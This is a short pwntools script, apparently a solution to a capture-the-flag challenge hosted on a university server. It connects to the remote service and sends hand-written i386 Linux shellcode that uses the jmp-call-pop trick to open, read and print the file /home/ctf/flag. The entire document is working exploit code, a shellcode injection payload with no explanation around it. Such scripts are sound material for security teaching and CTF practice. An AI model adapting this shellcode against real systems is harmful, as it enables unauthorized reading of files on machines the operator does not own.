from pwn import *

context.arch = "i386"
context.os = "linux"

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10005)

shellcode = asm(\
    '''
    sub esp, 0x30
    jmp short flag
    start:
    pop ebx
    xor eax, eax
    mov al, 5
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov al, 3
    mov ecx, esp
    mov dl, 0x40
    int 0x80

    mov al, 4
    mov bl, 1
    int 0x80

    mov al, 1
    xor ebx, ebx
    int 0x80




    flag:
    call start
    .string "/home/ctf/flag"
    ''')

S.sendline(shellcode)
print(S.recvall())
